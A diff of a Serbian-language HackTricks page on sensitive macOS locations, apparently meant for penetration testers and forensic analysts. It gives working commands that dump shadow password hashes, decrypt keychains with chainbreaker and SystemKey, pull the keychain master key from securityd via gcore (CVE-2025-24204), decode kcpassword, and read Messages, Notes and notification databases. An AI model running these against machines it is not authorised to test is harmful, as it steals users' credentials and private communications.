@@ -1,31 +1,31 @@
-# macOS Osetljive lokacije i zanimljivi demoni
+# macOS Sensitive Locations & Interesting Daemons
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Lozinke
 
-### Shadow lozinke
+### Shadow Lozinke
 
-Shadow password se čuva zajedno sa konfiguracijom korisnika u plist fajlovima koji se nalaze u **`/var/db/dslocal/nodes/Default/users/`**.\
-Sledeći oneliner može da se koristi za ispis **svih informacija o korisnicima** (uključujući informacije o hash-ovima):
+Shadow password se čuva sa korisnikovom konfiguracijom u plist fajlovima koji se nalaze u **`/var/db/dslocal/nodes/Default/users/`**.\
+Sledeći oneliner može da se koristi za dump **svih informacija o korisnicima** (uključujući hash info):
 ```bash
 for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
 ```
-[**Skripte poput ove**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ili [**ove**](https://github.com/octomagon/davegrohl.git) mogu se koristiti za pretvaranje hash-a u **hashcat** **format**.
+[**Skripte poput ovog**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ili [**ovog**](https://github.com/octomagon/davegrohl.git) mogu se koristiti za transformaciju hash-a u **hashcat** **format**.
 
-Alternativna jednolinijska naredba koja će ispisati kredencijale svih naloga koji nisu servisni u hashcat formatu `-m 7100` (macOS PBKDF2-SHA512):
+Alternativni one-liner koji će izbaciti creds svih non-service naloga u hashcat formatu `-m 7100` (macOS PBKDF2-SHA512):
 ```bash
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
-Još jedan način da se dobije `ShadowHashData` korisnika je korišćenjem `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
+Drugi način da se dobije `ShadowHashData` korisnika je korišćenjem `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
 
 ### /etc/master.passwd
 
-Ovaj fajl se **koristi samo** kada sistem radi u **single-user mode** (dakle ne često).
+Ovaj fajl se **koristi samo** kada sistem radi u **single-user mode** (dakle, ne baš često).
 
 ### Keychain Dump
 
-Imajte na umu da pri korišćenju security binary da biste **dump the passwords decrypted**, pojaviće se više upita koji traže od korisnika da dozvoli ovu operaciju.
+Imajte na umu da će, kada koristite security binary za **dump decrypted passwords**, nekoliko promptova tražiti od korisnika da dozvoli ovu operaciju.
 ```bash
 #security
 security dump-trust-settings [-s] [-d] #List certificates
@@ -34,46 +34,48 @@ security list-smartcards #List smartcards
 security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
 security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
 ```
+Na modernom macOS najzanimljiviji backing stores su obično **`~/Library/Keychains/login.keychain-db`** i **`/Library/Keychains/System.keychain`**. To su fajlovi zasnovani na SQLite-u, ali se pristup plaintext-u i dalje posreduje preko **`securityd`**: krađa sirove DB uglavnom ti daje metadata i enkriptovane blobove, osim ako ne povratiš i korisničku lozinku, `SystemKey`, ili master key u memoriji.
+
 ### [Keychaindump](https://github.com/juuso/keychaindump)
 
 > [!CAUTION]
-> Na osnovu ovog komentara [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) izgleda da ovi alati više ne rade na Big Sur.
+> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
 
-### Keychaindump Pregled
+### Pregled Keychaindump-a
 
-Alat nazvan **keychaindump** razvijen je za izvlačenje lozinki iz macOS keychain-ova, ali nailazi na ograničenja na novijim verzijama macOS-a kao što je Big Sur, kako je navedeno u [raspravi](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Korišćenje **keychaindump** zahteva da napadač dobije pristup i poveća privilegije na **root**. Alat iskorišćava činjenicu da je keychain po defaultu otključan prilikom prijave korisnika radi praktičnosti, što aplikacijama omogućava pristup bez ponovnog traženja korisnikove lozinke. Međutim, ako korisnik odluči da zaključava svoj keychain posle svake upotrebe, **keychaindump** postaje neefikasan.
+Alat pod nazivom **keychaindump** razvijen je za izvlačenje lozinki iz macOS keychain-ova, ali ima ograničenja na novijim macOS verzijama kao što je Big Sur, što je navedeno u [diskusiji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Korišćenje **keychaindump**-a zahteva da napadač dobije pristup i eskalira privilegije do **root**-a. Alat koristi činjenicu da je keychain podrazumevano otključan pri prijavi korisnika radi praktičnosti, što omogućava aplikacijama da mu pristupaju bez ponovnog traženja korisničke lozinke. Međutim, ako korisnik izabere da zaključava svoj keychain nakon svake upotrebe, **keychaindump** postaje neefikasan.
 
-**Keychaindump** radi tako što cilja specifičan proces zvan **securityd**, koji Apple opisuje kao daemon za autorizaciju i kriptografske operacije, ključan za pristup keychain-a. Proces ekstrakcije uključuje identifikaciju **Master Key** koji je izveden iz korisnikove lozinke za prijavu. Ovaj ključ je neophodan za čitanje keychain fajla. Da bi pronašao **Master Key**, **keychaindump** pretražuje memorijski heap procesa **securityd** koristeći komandu `vmmap`, tražeći potencijalne ključeve unutar oblasti označenih kao `MALLOC_TINY`. Sledeća komanda se koristi za pregled ovih memorijskih lokacija:
+**Keychaindump** radi ciljajući specifičan proces pod nazivom **securityd**, koji Apple opisuje kao daemon za autorizaciju i kriptografske operacije, ključan za pristup keychain-u. Proces ekstrakcije uključuje identifikovanje **Master Key**-a izvedenog iz korisničke login lozinke. Ovaj ključ je neophodan za čitanje fajla keychain-a. Da bi locirao **Master Key**, **keychaindump** skenira memorijski heap procesa **securityd** koristeći komandu `vmmap`, tražeći potencijalne ključeve unutar oblasti označenih kao `MALLOC_TINY`. Sledeća komanda se koristi za inspekciju ovih memorijskih lokacija:
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-Nakon identifikovanja potencijalnih master ključeva, **keychaindump** pretražuje heaps u potrazi za specifičnim obrascem (`0x0000000000000018`) koji ukazuje na kandidata za master ključ. Dalji koraci, uključujući deobfuscation, potrebni su da bi se taj ključ iskoristio, kako je opisano u izvornom kodu **keychaindump**-a. Analitičari koji se fokusiraju na ovu oblast treba da imaju u vidu da su ključni podaci za dešifrovanje keychain-a smešteni u memoriji procesa **securityd**. Primer komande za pokretanje **keychaindump** je:
+Nakon identifikovanja potencijalnih master ključeva, **keychaindump** pretražuje heap-ove u potrazi za specifičnim obrascem (`0x0000000000000018`) koji ukazuje na kandidata za master ključ. Dalji koraci, uključujući deobfuscation, neophodni su da bi se ovaj ključ iskoristio, kao što je opisano u izvornom kodu **keychaindump**. Analitičari koji se fokusiraju na ovu oblast treba da primete da se ključni podaci za dešifrovanje keychain-a nalaze u memoriji procesa **securityd**. Primer komande za pokretanje **keychaindump** je:
 ```bash
 sudo ./keychaindump
 ```
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) može da se koristi za ekstrakciju sledećih tipova informacija iz OSX keychain-a na forenzički ispravan način:
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker) može da se koristi za izdvajanje sledećih tipova informacija iz OSX keychain-a na forenzički ispravan način:
 
-- Hashovana Keychain lozinka, pogodna za razbijanje pomoću [hashcat](https://hashcat.net/hashcat/) ili [John the Ripper](https://www.openwall.com/john/)
-- Internet lozinke
-- Generičke lozinke
-- Privatni ključevi
-- Javni ključevi
-- X509 sertifikati
-- Sigurne beleške
-- Appleshare lozinke
+- Hashed Keychain password, pogodan za cracking pomoću [hashcat](https://hashcat.net/hashcat/) ili [John the Ripper](https://www.openwall.com/john/)
+- Internet Passwords
+- Generic Passwords
+- Private Keys
+- Public Keys
+- X509 Certificates
+- Secure Notes
+- Appleshare Passwords
 
-Ako su dostupni lozinka za otključavanje Keychain-a, master ključ dobijen korišćenjem [volafox](https://github.com/n0fate/volafox) ili [volatility](https://github.com/volatilityfoundation/volatility), ili datoteka za otključavanje kao što je SystemKey, Chainbreaker će takođe izvući lozinke u prostom tekstu.
+Ako je poznata lozinka za otključavanje keychain-a, master key dobijen pomoću [volafox](https://github.com/n0fate/volafox) ili [volatility](https://github.com/volatilityfoundation/volatility), ili unlock file kao što je SystemKey, Chainbreaker će takođe prikazati plaintext passwords.
 
-Bez jedne od ovih metoda za otključavanje Keychain-a, Chainbreaker će prikazati sve ostale dostupne informacije.
+Bez jednog od ovih metoda za otključavanje Keychain-a, Chainbreaker će prikazati sve ostale dostupne informacije.
 
-#### **Izdvajanje ključeva iz Keychain-a**
+#### **Dump keychain keys**
 ```bash
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
-#### **Izvuci keychain ključeve (sa lozinkama) pomoću SystemKey**
+#### **Dumppuj keychain ključeve (sa lozinkama) pomoću SystemKey**
 ```bash
 # First, get the keychain decryption key
 # To get this decryption key you need to be root and SIP must be disabled
@@ -81,7 +83,7 @@ hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
 ## Use the previous key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Dump keychain keys (with passwords) cracking the hash**
+#### **Izbacivanje keychain ključeva (sa lozinkama) cracking the hash**
 ```bash
 # Get the keychain hash
 python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
@@ -90,7 +92,7 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Izdvojite keychain ključeve (sa lozinkama) pomoću memory dump-a**
+#### **Ispisivanje keychain ključeva (sa lozinkama) pomoću memory dump-a**
 
 [Pratite ove korake](../index.html#dumping-memory-with-osxpmem) da biste izvršili **memory dump**
 ```bash
@@ -101,18 +103,18 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Dump keychain keys (with passwords) koristeći lozinku korisnika**
+#### **Damp keychain ključeve (sa lozinkama) koristeći korisničku lozinku**
 
-Ako znate lozinku korisnika, možete je iskoristiti da **dump and decrypt keychains that belong to the user**.
+Ako znate korisničku lozinku, možete je koristiti da **izvučete i dešifrujete keychains koji pripadaju korisniku**.
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
 ### Keychain master key via `gcore` entitlement (CVE-2025-24204)
 
-macOS 15.0 (Sequoia) je isporučio `/usr/bin/gcore` sa **`com.apple.system-task-ports.read`** entitlement-om, pa bilo koji lokalni admin (ili zlonamerna potpisana aplikacija) može dump-ovati **any process memory even with SIP/TCC enforced**. Dumping `securityd` leaks the **Keychain master key** in clear i omogućava dešifrovanje `login.keychain-db` bez korisničke lozinke.
+macOS 15.0 (Sequoia) je isporučio `/usr/bin/gcore` sa entitlement-om **`com.apple.system-task-ports.read`**, tako da je svaki lokalni admin (ili zlonamerna potpisana aplikacija) mogao da dump-uje **memoriju bilo kog procesa čak i uz primenjen SIP/TCC**. Dump-ovanje `securityd` otkriva **Keychain master key** u clear i omogućava ti da dekriptuješ `login.keychain-db` bez korisničke lozinke.
 
-**Brza reprodukcija na ranjivim buildovima (15.0–15.2):**
+**Brza repro na ranjivim build-ovima (15.0–15.2):**
 ```bash
 sudo pgrep securityd        # usually a single PID
 sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
@@ -129,12 +131,12 @@ Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login 
 
 ### kcpassword
 
-Fajl **kcpassword** sadrži **korisničku lozinku za prijavu**, ali samo ako vlasnik sistema ima **omogućeno automatsko prijavljivanje**. Stoga će korisnik biti automatski prijavljen bez traženja lozinke (što nije bezbedno).
+The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).
 
-Lozinka se čuva u fajlu **`/etc/kcpassword`** xored sa ključem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ako je korisnikova lozinka duža od ključa, ključ će se ponavljati.\
-Ovo čini lozinku prilično lakom za otkrivanje, na primer korišćenjem skripti poput [**ove**](https://gist.github.com/opshope/32f65875d45215c3677d).
+The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
+This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).
 
-## Zanimljive informacije u bazama podataka
+## Interesting Information in Databases
 
 ### Messages
 ```bash
@@ -144,41 +146,60 @@ sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
 sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
 sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 ```
-### Notifikacije
+### Notifications
 
-Podatke o notifikacijama možete pronaći u `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
+Pre **Sequoia**, obično možete pronaći Notification Center store u **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. U **Sequoia+** Apple ga je premestio u TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.
 
-Većina interesantnih informacija biće u **blob**. Dakle moraćete da **izvučete** taj sadržaj i **pretvorite** ga u **čitljiv** **oblik** ili da koristite **`strings`**. Da biste mu pristupili, možete uraditi:
+Većina zanimljivih informacija je pohranjena unutar **blob** kolona, tako da ćete morati da ekstrahujete taj sadržaj i transformišete ga u nešto čitljivo za čoveka (`plutil -p -`, `strings`, ili mali parser). Brzi primeri za triage:
 ```bash
-cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
-strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
+# Legacy location (older releases / affected builds)
+DA=$(getconf DARWIN_USER_DIR)
+strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
+sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -
+
+# Sequoia+ location (TCC-protected)
+sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
 ```
 #### Nedavni problemi sa privatnošću (NotificationCenter DB)
 
-- U macOS **14.7–15.1** Apple je čuvao sadržaj banera u `db2/db` SQLite bez adekvatnog redigovanja. CVE-ovi **CVE-2024-44292/44293/40838/54504** su omogućavali bilo kom lokalnom korisniku da pročita tekst notifikacija drugih korisnika samo otvaranjem DB (no TCC prompt). Ispravljeno u **15.2** pomeranjem/zaključavanjem DB; na starijim sistemima navedena putanja i dalje leaks nedavne notifikacije i priloge.
-- Baza podataka je čitljiva svima samo na pogođenim buildovima, pa prilikom istrage na nasleđenim endpointima kopirajte datoteku pre nadogradnje da sačuvate artefakte.
+- Na macOS **14.7–15.1** Apple je čuvao sadržaj banera u SQLite `db2/db` bez pravilne redakcije. CVE-ovi **CVE-2024-44292/44293/40838/54504** su omogućavali svakom lokalnom korisniku da pročita tekst obaveštenja drugih korisnika samo otvaranjem DB-a (bez TCC prompta).
+- Apple je ovo ublažio premeštanjem DB-a u `group.com.apple.usernoted` i zaštitom putem TCC na novijim Sequoia buildovima, tako da na trenutnim sistemima obično treba odgovarajući user context ili TCC bypass da bi se pročitao.
+- Na legacy endpointima, kopirajte fajlove `db`, `db-wal` i `db-shm` zajedno pre update-a ili reboot-a ako želite da sačuvate artefakte.
 
 ### Napomene
 
-Korisničke **beleške** se mogu naći u `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
+Korisničke **notes** mogu se naći u `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
 ```bash
 sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables
 
-#To dump it in a readable format:
-for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
+# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
+for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
 ```
-## Postavke
+Ako je one-liner iznad previše bučan, eksportuj `ZICNOTEDATA.ZDATA`, otpakuj ga sa gunzip, i parsiraj protobuf: ovo je obično pouzdanije nego direktno pokretanje `strings` nad SQLite bazom.
 
-U macOS aplikacijama postavke se nalaze u **`$HOME/Library/Preferences`** i na iOS-u su u `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
+### Background Tasks / Login Items
 
-U macOS-u CLI alat **`defaults`** može da se koristi za **izmenu Preferences fajla**.
+Od **Ventura**, user-approved login items i nekoliko background tasks se prate u **BTM** store-ovima kao što su **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** i verzionisani sistemski keš **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.
 
-**`/usr/sbin/cfprefsd`** preuzima XPC servise `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i može biti pozvan da izvrši radnje kao što je izmena postavki.
+Ovi fajlovi su korisni za brzo identifikovanje persistence, helper tools, i nekih MDM-managed background items:
+```bash
+plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
+sfltool dumpbtm
+```
+Za upornost i BTM internals, pogledajte [stranicu auto-start lokacija](../../macos-auto-start-locations.md#login-items) i [Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).
+
+## Preferences
+
+U macOS aplikacijama preferences se nalaze u **`$HOME/Library/Preferences`**, a u iOS-u su u `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
+
+U macOS-u CLI alat **`defaults`** može da se koristi za **modify Preferences file**.
+
+**`/usr/sbin/cfprefsd`** claim-uje XPC servise `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i može da se pozove da izvrši akcije kao što je modify preferences.
 
 ## OpenDirectory permissions.plist
 
-Fajl `/System/Library/OpenDirectory/permissions.plist` sadrži dozvole primenjene na atribute nodova i zaštićen je SIP.\
-Ovaj fajl dodeljuje dozvole određenim korisnicima po UUID-u (a ne po uid) tako da oni mogu pristupiti određenim osetljivim informacijama kao što su `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys`, između ostalog:
+Fajl `/System/Library/OpenDirectory/permissions.plist` sadrži permissions primenjene na node atribute i zaštićen je pomoću SIP-a.\
+Ovaj fajl dodeljuje permissions određenim korisnicima po UUID-u (a ne uid-u) tako da mogu da pristupe specifičnim sensitive information kao što su `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys` među ostalima:
 ```xml
 [...]
 <key>dsRecTypeStandard:Computers</key>
@@ -211,13 +232,13 @@ Ovaj fajl dodeljuje dozvole određenim korisnicima po UUID-u (a ne po uid) tako 
 </array>
 [...]
 ```
-## Sistemske notifikacije
+## System Notifications
 
-### Darwin notifikacije
+### Darwin Notifications
 
-Glavni daemon za notifikacije je **`/usr/sbin/notifyd`**. Da bi primili notifikacije, klijenti moraju da se registruju preko Mach porta `com.apple.system.notification_center` (proverite ih pomoću `sudo lsmp -p <pid notifyd>`). Daemon se može konfigurisati fajlom `/etc/notify.conf`.
+Glavni daemon za obaveštenja je **`/usr/sbin/notifyd`**. Da bi primili obaveštenja, klijenti moraju da se registruju kroz `com.apple.system.notification_center` Mach port (proverite ih sa `sudo lsmp -p <pid notifyd>`). Daemon se može podešavati pomoću fajla `/etc/notify.conf`.
 
-Imena koja se koriste za notifikacije su jedinstvene reverse DNS notacije i kada se notifikacija pošalje jednom od njih, klijent(i) koji su prijavili da je mogu obraditi će je primiti.
+Nazivi koji se koriste za obaveštenja su jedinstvene reverse DNS notacije i kada se obaveštenje pošalje jednom od njih, klijent(i) koji su naznačili da mogu da ga obrađuju će ga primiti.
 
 Moguće je ispisati trenutni status (i videti sva imena) slanjem signala SIGUSR2 procesu notifyd i čitanjem generisanog fajla: `/var/run/notifyd_<pid>.status`:
 ```bash
@@ -235,36 +256,37 @@ common: com.apple.CFPreferences._domainsChangedExternally
 common: com.apple.security.octagon.joined-with-bottle
 [...]
 ```
-### Distribuirani centar za obaveštavanja
+### Distributed Notification Center
 
-Distribuirani centar za obaveštavanja, čiji je glavni binarni fajl **`/usr/sbin/distnoted`**, predstavlja još jedan način za slanje notifikacija. Izlaže neke XPC servise i vrši određene provere u pokušaju da verifikuje klijente.
+**Distributed Notification Center** čiji je glavni binary **`/usr/sbin/distnoted`**, je još jedan način za slanje notifikacija. Izlaže neke XPC services i izvršava neke provere kako bi pokušao da verifikuje klijente.
 
 ### Apple Push Notifications (APN)
 
-U ovom slučaju, aplikacije mogu da se registruju za **teme**. Klijent će generisati token kontaktirajući Apple-ove servere putem **`apsd`**.\
-Zatim će i provajderi takođe generisati token i moći će da se povežu sa Apple-ovim serverima da šalju poruke klijentima. Te poruke će lokalno primati **`apsd`**, koji će preusmeriti notifikaciju aplikaciji koja je očekuje.
+U ovom slučaju, applications mogu da se registruju za **topics**. Klijent će generisati token kontaktirajući Apple-ove servere kroz **`apsd`**.\
+Zatim će i providers takođe generisati token i moći će da se povežu sa Apple-ovim serverima kako bi slali poruke klijentima. Ove poruke će lokalno primati **`apsd`**, koji će proslediti notifikaciju aplikaciji koja na nju čeka.
 
-Preferencije se nalaze u /Library/Preferences/com.apple.apsd.plist.
+Preferences se nalaze u `/Library/Preferences/com.apple.apsd.plist`.
 
-Postoji lokalna baza podataka poruka koja se nalazi na macOS-u u /Library/Application\ Support/ApplePushService/aps.db i na iOS-u u /var/mobile/Library/ApplePushService. Ima 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.
+Postoji lokalna database poruka koja se nalazi u macOS-u u `/Library/Application\ Support/ApplePushService/aps.db` i u iOS-u u `/var/mobile/Library/ApplePushService`. Ima 3 tables: `incoming_messages`, `outgoing_messages` i `channel`.
 ```bash
 sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
 ```
-Takođe je moguće dobiti informacije o daemonu i konekcijama koristeći:
+Takođe je moguće dobiti informacije o daemon-u i konekcijama koristeći:
 ```bash
 /System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
 ```
-## Korisnička obaveštenja
+## User Notifications
 
-Ovo su obaveštenja koja bi korisnik trebao da vidi na ekranu:
+Ovo su notifications koje korisnik treba da vidi na ekranu:
 
-- **`CFUserNotification`**: Ovi API-ji omogućavaju prikaz iskačućeg prozora sa porukom na ekranu.
-- **The Bulletin Board**: Ovo prikazuje na iOS-u baner koji nestaje i biće sačuvan u Notification Center-u.
-- **`NSUserNotificationCenter`**: Ovo je iOS bulletin board na MacOS-u. Baza podataka sa notifikacijama se nalazi u `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
+- **`CFUserNotification`**: Ovi API pružaju način da se prikaže pop-up na ekranu sa porukom.
+- **The Bulletin Board**: Ovo u iOS prikazuje banner koji nestaje i biće sačuvan u Notification Center.
+- **`NSUserNotificationCenter`**: Ovo je iOS bulletin board u MacOS. Na starijim macOS izdanjima baza podataka obično se nalazi u `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; na Sequoia+ je premeštena u `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.
 
-## Reference
+## References
 
-- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
-- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
+- **HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)**(https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
+- **Apple Platform Security – Keychain data protection**(https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
+- **9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia**(https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
 
 {{#include ../../../banners/hacktricks-training.md}}
